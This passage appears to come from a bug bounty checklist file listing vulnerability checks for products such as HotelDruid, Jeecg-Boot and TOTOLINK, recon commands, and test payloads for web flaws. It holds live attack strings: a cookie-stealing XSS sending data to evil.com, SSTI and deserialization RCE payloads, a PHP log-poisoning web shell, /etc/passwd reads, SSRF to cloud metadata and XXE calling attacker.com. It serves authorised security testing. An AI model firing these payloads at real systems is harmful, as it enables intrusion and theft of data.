- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=avideo

### Check AVideo for admin panel with default credentials
<!-- id: avideo-2 | severity: high | tags: avideo, admin, default-creds -->
AVideo admin panels with default credentials provide full site control — user management, video uploads, and server configuration.

**References:**
- https://github.com/WWBN/AVideo/security

---

## HotelDruid
<!-- id: hoteldruid | icon: 🛠️ | color: #e06c75 -->
Security checklists for HotelDruid property management system.

### Check HotelDruid for SQL injection and data exposure
<!-- id: hoteldruid-1 | severity: critical | tags: hoteldruid, sqli, pms, data-exposure -->
HotelDruid has unauthenticated SQL injection vulnerabilities exposing guest PII — names, addresses, credit card data, and booking history.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=hoteldruid

### Check HotelDruid for pre-auth admin account creation
<!-- id: hoteldruid-2 | severity: critical | tags: hoteldruid, auth-bypass, admin-creation -->
HotelDruid installer left accessible allows creating new admin accounts, granting full access to hotel reservations and guest data.

**References:**
- https://www.hoteldruid.com/security.html

---

## OpenCATS
<!-- id: opencats | icon: 🛠️ | color: #e06c75 -->
Security checklists for OpenCATS open-source applicant tracking system.

### Check OpenCATS for SQL injection and credential exposure
<!-- id: opencats-1 | severity: critical | tags: opencats, sqli, credential-exposure, ats -->
Multiple OpenCATS versions allow SQL injection enabling extraction of candidate PII, resumes, and recruiter credentials.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=opencats

### Check OpenCATS for exposed attachments and resume files
<!-- id: opencats-2 | severity: high | tags: opencats, file-exposure, pii -->
OpenCATS attachments directory without authentication exposes uploaded resumes containing candidate names, addresses, phone numbers, and employment history.

**References:**
- https://www.opencats.org/security/

---

## Tiki Wiki CMS Groupware
<!-- id: tiki-wiki | icon: 🛠️ | color: #e06c75 -->
Security checklists for Tiki Wiki CMS Groupware.

### Check Tiki Wiki for SQL injection and RCE
<!-- id: tiki-1 | severity: critical | tags: tiki-wiki, sqli, rce, cms -->
Tiki Wiki contains unauthenticated SQL injection vulnerabilities allowing full database extraction and potential Remote Code Execution.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=tiki+wiki

### Check Tiki Wiki for exposed admin panels and default credentials
<!-- id: tiki-2 | severity: high | tags: tiki-wiki, admin, default-creds -->
Tiki Wiki admin panels exposed with default credentials give full site control including theme customization leading to PHP code execution.

**References:**
- https://tiki.org/Security

---

## Eclipse BIRT
<!-- id: eclipse-birt | icon: 🛠️ | color: #e06c75 -->
Security checklists for Eclipse BIRT (Business Intelligence and Reporting Tools) Java reporting framework.

### Check BIRT for unauthenticated SSRF and file disclosure
<!-- id: birt-1 | severity: high | tags: eclipse-birt, ssrf, file-read, reporting -->
Eclipse BIRT viewer may allow unauthenticated SSRF and file disclosure via the __report parameter, exposing internal network services and server file content.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=eclipse+birt

### Check BIRT for deserialization RCE via report templates
<!-- id: birt-2 | severity: critical | tags: eclipse-birt, deserialization, rce -->
BIRT report engine processing untrusted report designs may deserialize crafted templates leading to Remote Code Execution.

**References:**
- https://www.eclipse.org/security/

---

## ResourceSpace
<!-- id: resourcespace | icon: 🛠️ | color: #e06c75 -->
Security checklists for ResourceSpace open-source digital asset management platform.

### Check ResourceSpace for SQL injection and path traversal
<!-- id: resourcespace-1 | severity: critical | tags: resourcespace, sqli, path-traversal, dam -->
ResourceSpace has unauthenticated SQL injection and path traversal vulnerabilities enabling database extraction and file download of uploaded assets.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=resourcespace

### Check ResourceSpace for exposed asset downloads without authentication
<!-- id: resourcespace-2 | severity: high | tags: resourcespace, unauthorized-access, asset-exposure -->
ResourceSpace misconfigured authentication allows unauthorized download of private digital assets, including copyrighted media and confidential documents.

**References:**
- https://www.resourcespace.com/security/

---

## EyesOfNetwork
<!-- id: eyesofnetwork | icon: 🛠️ | color: #e06c75 -->
Security checklists for EyesOfNetwork network monitoring platform.

### Check EyesOfNetwork for OS command injection RCE (CVE-2023-36007)
<!-- id: eon-1 | severity: critical | tags: eyesofnetwork, rce, command-injection, cve -->
CVE-2023-36007 allows unauthenticated OS command injection in EyesOfNetwork via the web interface, enabling full server compromise.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36007

### Check EyesOfNetwork for default admin credentials
<!-- id: eon-2 | severity: high | tags: eyesofnetwork, default-creds, admin, monitoring -->
EyesOfNetwork with default credentials exposes all monitored hosts, SNMP community strings, and allows arbitrary Nagios command execution.

**References:**
- https://www.eyesofnetwork.com/security/

---

## BigAnt
<!-- id: bigant | icon: 🛠️ | color: #e06c75 -->
Security checklists for BigAnt enterprise instant messaging server.

### Check BigAnt for SQL injection and credential exposure
<!-- id: bigant-1 | severity: critical | tags: bigant, sqli, credential-exposure, im -->
BigAnt server web interface has known SQL injection vulnerabilities allowing extraction of all chat message archives and user credentials.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=bigant

### Check BigAnt for exposed message archives and file transfers
<!-- id: bigant-2 | severity: high | tags: bigant, data-exposure, file-transfer -->
BigAnt message archives exposed without authentication reveal internal communications and transferred files containing sensitive business data.

**References:**
- https://www.bigantsoft.com/security.html

---

## Jeecg-Boot
<!-- id: jeecgboot | icon: 🛠️ | color: #e06c75 -->
Security checklists for Jeecg-Boot low-code development platform.

### Check Jeecg-Boot for unauthenticated SQL injection (CVE-2024-52564)
<!-- id: jeecgboot-1 | severity: critical | tags: jeecgboot, sqli, rce, cve -->
CVE-2024-52564 allows unauthenticated SQL injection in Jeecg-Boot enabling full database extraction and potential Remote Code Execution via JDBC attacks.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-52564

### Check Jeecg-Boot for default credentials and exposed dashboards
<!-- id: jeecgboot-2 | severity: high | tags: jeecgboot, default-creds, admin -->
Jeecg-Boot with default credentials (admin/123456 or admin/admin123) exposes generated applications, database connections, and deployment configurations.

**References:**
- https://github.com/jeecg-boot/jeecg-boot/security/advisories

---

## YONYOU NC
<!-- id: yonyou-nc | icon: 🛠️ | color: #e06c75 -->
Security checklists for YONYOU NC enterprise ERP platform.

### Check YONYOU NC for pre-auth deserialization RCE (CVE-2024-0583)
<!-- id: yonyou-1 | severity: critical | tags: yonyou-nc, rce, deserialization, erp, cve -->
CVE-2024-0583 allows unauthenticated deserialization RCE in YONYOU NC — one of the most widely deployed ERP platforms in China, targeted heavily by ransomware groups.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-0583

### Check YONYOU NC for SQL injection in API endpoints
<!-- id: yonyou-2 | severity: critical | tags: yonyou-nc, sqli, api, erp -->
Multiple YONYOU NC API endpoints contain SQL injection enabling extraction of financial data, payroll records, and supplier/vendor databases.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=yonyou+nc

---

## TOTOLINK
<!-- id: totolink | icon: 🛠️ | color: #e06c75 -->
Security checklists for TOTOLINK home and SOHO routers.

### Check TOTOLINK for unauthenticated command injection (CVE-2024-33038)
<!-- id: totolink-1 | severity: critical | tags: totolink, command-injection, rce, iot, cve -->
Multiple TOTOLINK router models contain unauthenticated command injection in web management interfaces — frequently targeted by IoT botnets (Mirai variants).

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=totolink

### Check TOTOLINK for hardcoded credentials and backdoor accounts
<!-- id: totolink-2 | severity: critical | tags: totolink, backdoor, default-creds, iot -->
Several TOTOLINK device models have hardcoded admin credentials and telnet backdoors discoverable via firmware analysis.

**References:**
- https://www.exploit-db.com/search?q=totolink

---

## openSIS
<!-- id: open-sis | icon: 🛠️ | color: #e06c75 -->
Security checklists for openSIS student information system.

### Check openSIS for SQL injection and data exposure
<!-- id: opensis-1 | severity: critical | tags: open-sis, sqli, student-data, pii -->
Multiple openSIS versions contain unauthenticated SQL injection enabling extraction of student PII — names, addresses, SSNs, grades, and disciplinary records.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=opensis

### Check openSIS for exposed admin panel with default credentials
<!-- id: opensis-2 | severity: high | tags: open-sis, default-creds, admin -->
openSIS admin panels accessible with default credentials provide full access to student records, attendance logs, and grade books.

**References:**
- https://www.opensis.com/security/

---

## Emlog
<!-- id: emlog | icon: 🛠️ | color: #e06c75 -->
Security checklists for Emlog PHP blogging platform.

### Check Emlog for SQL injection (CVE-2024-32782)
<!-- id: emlog-1 | severity: high | tags: emlog, sqli, blog, cve -->
CVE-2024-32782 and related vulnerabilities allow SQL injection in Emlog enabling extraction of user credentials and blog database contents.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?keyword=emlog

### Check Emlog for authenticated RCE via plugin/theme upload
<!-- id: emlog-2 | severity: critical | tags: emlog, rce, file-upload, blog -->
Emlog plugin and theme management without proper file validation allows PHP file upload leading to server-side code execution.

**References:**
- https://github.com/emlog/emlog/security/advisories

---

# Methodologies
<!-- categoryKey: methodologies | icon: 📋 | color: #56b6c2 -->
Step-by-step methodologies for core bug bounty reconnaissance and testing workflows.

---

## Subdomain Enumeration
<!-- id: subdomain-enumeration | icon: 📋 | color: #56b6c2 -->
Complete methodology for discovering subdomains through passive, active, and permutation techniques.

### Subdomain enumeration via passive sources
<!-- id: sub-enum-1 | severity: info | tags: subdomain-enum, passive, recon -->
Collect subdomains from passive sources like certificate logs, search engines, DNS records without touching the target.

**Commands:**
```
curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u
subfinder -d target.com -silent
assetfinder --subs-only target.com
```

**References:**
- https://github.com/projectdiscovery/subfinder
- https://github.com/tomnomnom/assetfinder

### Subdomain enumeration via DNS brute-force
<!-- id: sub-enum-2 | severity: info | tags: subdomain-enum, dns, bruteforce -->
Brute-force common subdomain names using a wordlist against the target domain's DNS servers.

**Commands:**
```
puredns bruteforce /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt target.com -r resolvers.txt
dnsx -d target.com -w subdomains-top1million-5000.txt
```

**References:**
- https://github.com/projectdiscovery/puredns
- https://github.com/projectdiscovery/dnsx

### Subdomain permutation scanning
<!-- id: sub-enum-3 | severity: info | tags: subdomain-enum, permutations, advanced -->
Generate permutations of discovered subdomains to find hidden subdomains.

**Commands:**
```
gotator -sub discovered.target.com -perm permutations_list.txt -silent | dnsx -silent
alterx -d target.com -list discovered.txt | dnsx -silent
```

**References:**
- https://github.com/Josue87/gotator
- https://github.com/projectdiscovery/alterx

### Resolve and validate discovered subdomains
<!-- id: sub-enum-4 | severity: info | tags: subdomain-enum, validation, resolution -->
Resolve subdomains to IPs, filter live hosts, and probe for HTTP/HTTPS services.

**Commands:**
```
cat subdomains.txt | dnsx -a -resp -silent | tee resolved.txt
cat subdomains.txt | httpx -silent | tee live.txt
cat subdomains.txt | httpx -title -tech-detect -status-code -silent
```

**References:**
- https://github.com/projectdiscovery/httpx

---

## URL Crawling
<!-- id: url-crawling | icon: 📋 | color: #56b6c2 -->
Methodology for collecting URLs from JavaScript files, historical sources, and active spidering.

### Crawl URLs from JavaScript files
<!-- id: url-crawl-1 | severity: info | tags: url-crawling, javascript, recon -->
Extract endpoints embedded in JavaScript files. Many API routes exist only in JS.

**Commands:**
```
cat live.txt | katana -js-crawl -silent | tee js-endpoints.txt
gau --subs target.com | grep '\.js' | sort -u
```

**References:**
- https://github.com/projectdiscovery/katana
- https://github.com/lc/gau

### Collect URLs from historical sources
<!-- id: url-crawl-2 | severity: info | tags: url-crawling, passive, historical -->
Use passive sources to collect historically crawled URLs from Wayback Machine, CommonCrawl, etc.

**Commands:**
```
gau --subs target.com | sort -u | tee all-urls.txt
waybackurls target.com | sort -u | tee wayback-urls.txt
katana -passive -target target.com -silent
```

**References:**
- https://github.com/lc/gau
- https://github.com/tomnomnom/waybackurls

### Spider/crawl discovered subdomains
<!-- id: url-crawl-3 | severity: info | tags: url-crawling, active, spidering -->
Actively spider live subdomains to discover all accessible pages and endpoints.

**Commands:**
```
katana -u https://target.com -d 3 -silent | sort -u
gospider -s https://target.com -c 5 -t 10 -d 2 --sitemap --robots
hakrawler -url https://target.com -depth 3 -plain
```

**References:**
- https://github.com/jaeles-project/gospider
- https://github.com/hakluke/hakrawler

---

## Fuzzing
<!-- id: fuzzing | icon: 📋 | color: #56b6c2 -->
Methodology for directory, parameter, vhost, and HTTP method fuzzing techniques.

### Directory and file fuzzing
<!-- id: fuzzing-1 | severity: info | tags: fuzzing, directory, content-discovery -->
Brute-force directories and files to find hidden endpoints, admin panels, backup files.

**Commands:**
```
ffuf -u https://target.com/FUZZ -w directory-list-2.3-medium.txt -t 50 -c
ffuf -u https://target.com/FUZZ -w raft-large-files.txt -t 50 -c -mc 200,204,301,302,403
gobuster dir -u https://target.com -w common.txt -t 50
```

**References:**
- https://github.com/ffuf/ffuf
- https://github.com/OJ/gobuster

### Parameter fuzzing for hidden parameters
<!-- id: fuzzing-2 | severity: medium | tags: fuzzing, parameters, hidden -->
Discover hidden GET/POST parameters that may enable additional functionality.

**Commands:**
```
ffuf -u 'https://target.com/api/endpoint?FUZZ=1' -w burp-parameter-names.txt -fs 0
arjun -u https://target.com/api/endpoint -t 10
x8 -u https://target.com/api/endpoint -w burp-parameter-names.txt
```

**References:**
- https://github.com/s0md3v/Arjun
- https://github.com/Sh1Yo/x8

### Virtual host fuzzing
<!-- id: fuzzing-3 | severity: high | tags: fuzzing, vhost, discovery -->
Discover hidden virtual hosts by fuzzing the Host header.

**Commands:**
```
ffuf -u https://target.com -H 'Host: FUZZ.target.com' -w subdomains-top1million-5000.txt -fc 200,301,302
ffuf -u https://target.com -H 'Host: FUZZ' -w subdomains-top1million-5000.txt -fc 200
```

**References:**
- https://portswigger.net/web-security/host-header

### Content-type and HTTP method fuzzing
<!-- id: fuzzing-4 | severity: medium | tags: fuzzing, http-methods, content-type -->
Fuzz different Content-Type headers and HTTP methods to find alternative access methods.

**Commands:**
```
ffuf -u https://target.com/api/endpoint -X POST -H 'Content-Type: FUZZ' -w content-type.txt -d 'test=data'
curl -X OPTIONS https://target.com/api/endpoint -v
```

---

# Vulnerabilities
<!-- categoryKey: vulnerabilities | icon: 💥 | color: #e5c07b -->
Testing checklists for common web vulnerability classes, ordered by impact and complexity.

---

## XSS (Cross-Site Scripting)
<!-- id: xss | icon: 💥 | color: #e5c07b -->
Checklists for finding Reflected, Stored, and DOM-based Cross-Site Scripting vulnerabilities.

### Test for reflected XSS in URL parameters
<!-- id: xss-1 | severity: high | tags: xss, reflected, injection -->
Inject JavaScript payloads in all URL parameters. Check if input is reflected without sanitization.

**Commands:**
```
curl -s 'https://target.com/search?q=<script>alert(1)</script>' | grep -i 'alert'
curl -s 'https://target.com/?cat=1&page=<img src=x onerror=alert(1)>' | grep -i 'onerror'
```

**References:**
- https://portswigger.net/web-security/cross-site-scripting/reflected

### Test for stored XSS in user inputs
<!-- id: xss-2 | severity: critical | tags: xss, stored, injection -->
Submit XSS payloads in forms, comments, profile fields. Payloads execute when other users view the page.

**Commands:**
```
Submit <script>alert(document.cookie)</script> in comment/name fields
Submit <img src=x onerror='fetch("https://evil.com/"+document.cookie)'> in profile fields
```

**References:**
- https://portswigger.net/web-security/cross-site-scripting/stored

### Test DOM-based XSS via fragment/hash
<!-- id: xss-3 | severity: high | tags: xss, dom-based, client-side -->
Check if JavaScript uses location.hash or document.URL without sanitization.

**Commands:**
```
document.location.hash = '<img src=x onerror=alert(1)>';
document.location = 'https://target.com/#<script>alert(1)</script>';
```

**References:**
- https://portswigger.net/web-security/cross-site-scripting/dom-based

### Test XSS in file upload filenames
<!-- id: xss-4 | severity: medium | tags: xss, file-upload, stored -->
Upload files with XSS payloads in filenames. If filename is reflected, it may execute in a browser.

**Commands:**
```
Upload file named: <script>alert(1)</script>.txt
Upload file named: "><img src=x onerror=alert(1)>.txt
```

**References:**
- https://portswigger.net/research/file-upload-attacks

---

## Open Redirect
<!-- id: open-redirect | icon: 💥 | color: #e5c07b -->
Checklists for finding and bypassing open redirect vulnerabilities.

### Check URL redirect parameters for open redirect
<!-- id: open-redirect-1 | severity: medium | tags: open-redirect, url-manipulation -->
Common redirect parameters (url, redirect, next, returnTo) can often be abused to redirect users to external sites.

**Commands:**
```
curl -sI 'https://target.com/redirect?url=https://evil.com'
curl -sI 'https://target.com/go?to=https://evil.com'
curl -sI 'https://target.com/?next=https://evil.com'
curl -sI 'https://target.com/?returnUrl=https://evil.com'
```

**References:**
- https://portswigger.net/web-security/dom-based/open-redirect

### Test open redirect with URL parsers bypass
<!-- id: open-redirect-2 | severity: medium | tags: open-redirect, bypass, url-parser -->
Use protocol confusion, CRLF injection, or @ character to bypass URL validation filters.

**Commands:**
```
curl -sI 'https://target.com/redirect?url=https://target.com@evil.com'
curl -sI 'https://target.com/redirect?url=//evil.com'
curl -sI 'https://target.com/redirect?url=///evil.com'
curl -sI 'https://target.com/redirect?url=https://evil.com%2f@target.com'
```

**References:**
- https://portswigger.net/web-security/dom-based/open-redirect

---

## SQL Injection (SQLi)
<!-- id: sql-injection | icon: 💥 | color: #e5c07b -->
Checklists for detecting and exploiting SQL injection vulnerabilities.

### Test for SQL injection with time-based payloads
<!-- id: sqli-1 | severity: critical | tags: sqli, time-based, blind -->
Use time-based SQL injection to identify blind SQLi. Delayed response indicates a potential injection point.

**Commands:**
```
curl -s 'https://target.com/product?id=1'
curl -s 'https://target.com/product?id=1%20WAITFOR%20DELAY%20%2700:00:05%270'
curl -s 'https://target.com/product?id=1'%20AND%20SLEEP(5)--
```

**References:**
- https://portswigger.net/web-security/sql-injection

### Test for error-based SQL injection
<!-- id: sqli-2 | severity: critical | tags: sqli, error-based, enumeration -->
Inject SQL syntax errors to trigger database error messages that can leak schema info.

**Commands:**
```
curl -s 'https://target.com/product?id=1%27'
curl -s 'https://target.com/product?id=1%22'
curl -s 'https://target.com/product?id=1%27%20AND%201=CONVERT(int,%20@@version)--'
```

**References:**
- https://portswigger.net/web-security/sql-injection/cheat-sheet

---

## SSRF
<!-- id: ssrf | icon: 💥 | color: #e5c07b -->
Checklists for detecting Server-Side Request Forgery vulnerabilities.

### Test SSRF by targeting internal services
<!-- id: ssrf-1 | severity: critical | tags: ssrf, internal, cloud -->
Input URLs targeting internal services (127.0.0.1, 169.254.169.254) to access internal metadata.

**Commands:**
```
curl -s 'https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/'
curl -s 'https://target.com/fetch?url=http://127.0.0.1:22'
curl -s 'https://target.com/fetch?url=http://10.0.0.1:8080'
```

**References:**
- https://portswigger.net/web-security/ssrf

### Test SSRF via DNS rebinding
<!-- id: ssrf-2 | severity: critical | tags: ssrf, dns-rebinding, advanced -->
Use DNS rebinding to bypass hostname-based allowlists to access internal IPs.

**Commands:**
```
Use a DNS rebinding tool like rebind.it or 1u.ms
```

**References:**
- https://portswigger.net/web-security/ssrf/dns-rebinding

---

## SSTI (Server-Side Template Injection)
<!-- id: ssti | icon: 💥 | color: #e5c07b -->
Checklists for detecting and exploiting Server-Side Template Injection.

### Test for SSTI with basic math expressions
<!-- id: ssti-1 | severity: critical | tags: ssti, injection, template -->
Inject {{7*7}} in inputs. If output contains '49', the template engine evaluates user input.

**Commands:**
```
curl -s 'https://target.com/hello?name={{7*7}}' | grep '49'
curl -s 'https://target.com/hello?name=${{7*7}}' | grep '49'
curl -s 'https://target.com/hello?name=#{7*7}' | grep '49'
```

**References:**
- https://portswigger.net/web-security/server-side-template-injection

### Test SSTI for RCE via template engine
<!-- id: ssti-2 | severity: critical | tags: ssti, rce, exploitation -->
Once SSTI is confirmed, use engine-specific payloads for RCE (Jinja2, Freemarker, Twig).

**Commands:**
```
Jinja2: {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
Freemarker: ${7*7} -> <#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
Twig: {{ ['id']|filter('system') }}
```

**References:**
- https://portswigger.net/web-security/server-side-template-injection/exploiting
- https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection

---

## LFI (Local File Inclusion)
<!-- id: lfi | icon: 💥 | color: #e5c07b -->
Checklists for detecting and exploiting Local File Inclusion vulnerabilities.

### Test LFI with path traversal sequences
<!-- id: lfi-1 | severity: high | tags: lfi, path-traversal, file-read -->
Use ../ sequences to traverse directories and read sensitive files like /etc/passwd.

**Commands:**
```
curl -s 'https://target.com/file?name=../../../etc/passwd' | head -20
curl -s 'https://target.com/file?name=....//....//....//etc/passwd' | head -20
curl -s 'https://target.com/file?name=..%252f..%252f..%252fetc/passwd' | head -20
```

**References:**
- https://portswigger.net/web-security/file-path-traversal

### Test LFI with PHP wrappers
<!-- id: lfi-2 | severity: high | tags: lfi, php-wrapper, source-code -->
Use php://filter to read source code without executing it.

**Commands:**
```
curl -s 'https://target.com/file?name=php://filter/convert.base64-encode/resource=index.php'
curl -s 'https://target.com/file?name=php://filter/convert.base64-encode/resource=config.php'
```

**References:**
- https://portswigger.net/web-security/file-path-traversal

### Test LFI for log injection (log poisoning)
<!-- id: lfi-3 | severity: critical | tags: lfi, log-poisoning, rce -->
Inject PHP code into server logs, then access the log file via LFI to execute injected code.

**Commands:**
```
curl -s -H 'User-Agent: <?php system($_GET["cmd"]); ?>' https://target.com/
curl -s 'https://target.com/file?name=../../../../var/log/apache2/access.log&cmd=id'
curl -s 'https://target.com/file?name=../../../../var/log/nginx/access.log&cmd=id'
```

**References:**
- https://book.hacktricks.xyz/pentesting-web/file-inclusion#log-poisoning

---

## OS Command Injection
<!-- id: command-injection | icon: 💥 | color: #e5c07b -->
Checklists for detecting OS command injection vulnerabilities.

### Test for command injection via shell metacharacters
<!-- id: cmdi-1 | severity: critical | tags: command-injection, rce, injection -->
Inject OS command separators (;, |, &&, ||, newline) into all user-controlled inputs that may be passed to shell functions — hostnames, filenames, search fields.

**Commands:**
```
curl 'https://target.com/ping?host=127.0.0.1;id'
curl 'https://target.com/ping?host=127.0.0.1|whoami'
curl 'https://target.com/ping?host=`id`'
curl 'https://target.com/ping?host=127.0.0.1%0Aid'
```

**References:**
- https://portswigger.net/web-security/os-command-injection

### Test blind OS command injection via time delays
<!-- id: cmdi-2 | severity: critical | tags: command-injection, blind, time-delay -->
Use sleep or ping -c to detect blind command injection when no output is reflected in the response.

**Commands:**
```
curl 'https://target.com/ping?host=127.0.0.1;sleep+10'
curl 'https://target.com/ping?host=127.0.0.1%26%26sleep%2010'
```

**References:**
- https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays

---

## NoSQL Injection
<!-- id: nosql-injection | icon: 💥 | color: #e5c07b -->
Checklists for detecting NoSQL injection in MongoDB and similar databases.

### Test MongoDB operator injection for authentication bypass
<!-- id: nosqli-1 | severity: high | tags: nosql, mongodb, auth-bypass, injection -->
Inject MongoDB operators ($gt, $ne, $where) to bypass authentication or extract data from the database.

**Commands:**
```
curl -X POST https://target.com/login -d 'username[$ne]=x&password[$ne]=x'
curl -X POST https://target.com/login -H 'Content-Type: application/json' -d '{"username":{"$gt":""},"password":{"$gt":""}}'
curl 'https://target.com/api/users?username[$regex]=.*'
```

**References:**
- https://portswigger.net/web-security/nosql-injection

---

## LDAP Injection
<!-- id: ldap-injection | icon: 💥 | color: #e5c07b -->
Checklists for detecting LDAP injection vulnerabilities.

### Test LDAP injection in login and search fields
<!-- id: ldapi-1 | severity: high | tags: ldap, injection, auth-bypass -->
Inject LDAP metacharacters (*, ), (, \) into username and search fields to bypass authentication or dump directory entries.

**Commands:**
```
Username: admin)(&)
Username: *)(uid=*))(|(uid=*
Username: *
curl 'https://target.com/search?q=*)%28%7C%28cn%3D*'
```

**References:**
- https://owasp.org/www-community/attacks/LDAP_Injection

---

## XML Injection & XXE
<!-- id: xxe | icon: 💥 | color: #e5c07b -->
Checklists for detecting XML External Entity and XML injection vulnerabilities.

### Test for XXE via external entity file read
<!-- id: xxe-1 | severity: critical | tags: xxe, file-read, ssrf, injection -->
Inject an external entity declaration in XML input to read local files or trigger SSRF to internal services.

**Commands:**
```
POST /xml-endpoint:
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]><foo>&xxe;</foo>
```

**References:**
- https://portswigger.net/web-security/xxe

### Test for blind XXE via out-of-band (OOB) techniques
<!-- id: xxe-2 | severity: critical | tags: xxe, blind, oob, ssrf -->
Use parameter entities and Burp Collaborator/interact.sh to detect XXE when output is not reflected.

**Commands:**
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://attacker.com/evil.dtd"> %xxe;]>
```

**References:**
- https://portswigger.net/web-security/xxe/blind

---

## CSRF (Cross-Site Request Forgery)
<!-- id: csrf | icon: 💥 | color: #e5c07b -->
Checklists for detecting and exploiting Cross-Site Request Forgery vulnerabilities.

### Test for missing or bypassable CSRF tokens
<!-- id: csrf-1 | severity: high | tags: csrf, token, state-changing -->
Check if state-changing requests (password change, email update, settings) validate CSRF tokens or rely solely on cookies.

**Commands:**
```
Replay POST request without CSRF token — if succeeds: vulnerable
Replace CSRF token with random string — if succeeds: not validated
Remove CSRF token entirely — if succeeds: missing protection
```

**References:**
- https://portswigger.net/web-security/csrf

### Test CSRF via SameSite cookie bypass and GET-based attacks
<!-- id: csrf-2 | severity: high | tags: csrf, bypass, same-site, get -->
Try submitting state-changing actions via GET, bypassing Lax SameSite via top-level navigations or legacy browser quirks.

**References:**
- https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions

---

## CORS Misconfiguration
<!-- id: cors | icon: 💥 | color: #e5c07b -->
Checklists for detecting Cross-Origin Resource Sharing misconfigurations.

### Test for reflected Origin in Access-Control-Allow-Origin
<!-- id: cors-1 | severity: high | tags: cors, misconfiguration, acao -->
Send a crafted Origin header and check if it is reflected with Access-Control-Allow-Credentials: true.

**Commands:**
```
curl -H 'Origin: https://evil.com' https://target.com/api/data -v | grep -i 'access-control'
curl -H 'Origin: https://target.com.evil.com' https://target.com/api/data -v | grep -i acao
curl -H 'Origin: null' https://target.com/api/data -v | grep -i acao
```

**References:**
- https://portswigger.net/web-security/cors

---

## Clickjacking
<!-- id: clickjacking | icon: 💥 | color: #e5c07b -->
Checklists for detecting Clickjacking and UI redress vulnerabilities.

### Test for missing X-Frame-Options or CSP frame-ancestors
<!-- id: clickjacking-1 | severity: medium | tags: clickjacking, x-frame-options, ui-redress -->
Check if the target page can be embedded in an iframe — missing framing protection enables clickjacking attacks.

**Commands:**
```
curl -sI https://target.com | grep -i 'x-frame-options\|content-security-policy'
```

**References:**
- https://portswigger.net/web-security/clickjacking

---

## Deserialization Attacks
<!-- id: deserialization | icon: 💥 | color: #e5c07b -->
Checklists for detecting insecure deserialization vulnerabilities.

### Test Java deserialization via ysoserial gadget chains
<!-- id: deser-1 | severity: critical | tags: deserialization, java, rce, ysoserial -->
Java apps deserializing untrusted data (look for rO0AB or \xac\xed prefix) may be exploitable via known gadget chains.

**Commands:**
```
java -jar ysoserial.jar CommonsCollections6 'id' | base64
// Send payload in cookie or parameter deserialized server-side
```

**References:**
- https://github.com/frohoff/ysoserial
- https://portswigger.net/web-security/deserialization

### Test PHP deserialization via phpggc gadget chains
<!-- id: deser-2 | severity: critical | tags: deserialization, php, rce, phpggc -->
PHP objects passed to unserialize() with exploitable __wakeup/__destruct magic methods can lead to RCE.

**Commands:**
```
phpggc Laravel/RCE1 system id | base64
// Send base64 payload in cookie or parameter
```

**References:**
- https://github.com/ambionics/phpggc

---

## JWT Security Testing
<!-- id: jwt | icon: 💥 | color: #e5c07b -->
Checklists for testing JSON Web Token implementation security.

### Test JWT algorithm confusion (none / RS256 to HS256)
<!-- id: jwt-1 | severity: critical | tags: jwt, algorithm-confusion, auth-bypass -->
Switch algorithm to 'none' to bypass verification, or change RS256 to HS256 and sign with the server's public key.

**Commands:**
```
python3 jwt_tool.py <token> -X a
python3 jwt_tool.py <token> -X k -pk public.pem
```

**References:**
- https://portswigger.net/web-security/jwt

### Test JWT header injection via jku/kid parameters
<!-- id: jwt-2 | severity: high | tags: jwt, jku, kid, header-injection -->
Inject a jku/x5u header pointing to attacker-controlled JWKS to have the server accept a forged token.

**Commands:**
```
python3 jwt_tool.py <token> -X s -ju 'https://attacker.com/jwks.json'
```

**References:**
- https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection

---

## Business Logic Vulnerabilities
<!-- id: business-logic | icon: 💥 | color: #e5c07b -->
Checklists for discovering business logic flaws in application workflows.

### Test for price manipulation and negative quantity values
<!-- id: bizlogic-1 | severity: high | tags: business-logic, price-manipulation, ecommerce -->
Modify prices, quantities, or discounts to negative/zero values and verify backend recalculates server-side.

**Commands:**
```
Intercept checkout request: price=-1, quantity=0
Apply discount codes multiple times (replay attack)
Add item, apply coupon, remove item — check if discount persists
```

**References:**
- https://portswigger.net/web-security/logic-flaws

### Test multi-step workflow bypass by skipping steps
<!-- id: bizlogic-2 | severity: high | tags: business-logic, workflow-bypass, step-skip -->
Skip steps in multi-stage processes (checkout, verification, approval) by directly accessing later steps.

**References:**
- https://portswigger.net/web-security/logic-flaws/examples

---

## Race Conditions
<!-- id: race-conditions | icon: 💥 | color: #e5c07b -->
Checklists for detecting and exploiting race condition vulnerabilities.

### Test race condition on coupon and voucher redemption
<!-- id: race-1 | severity: high | tags: race-condition, coupon, limit-bypass -->
Send simultaneous requests to redeem a single-use coupon. Non-atomic check-and-use allows multiple redemptions.

**Commands:**
```
// Burp Turbo Intruder: 20+ concurrent POST /redeem-coupon with same code
// Burp Repeater: Group tab send-in-parallel feature
```

**References:**
- https://portswigger.net/web-security/race-conditions

---

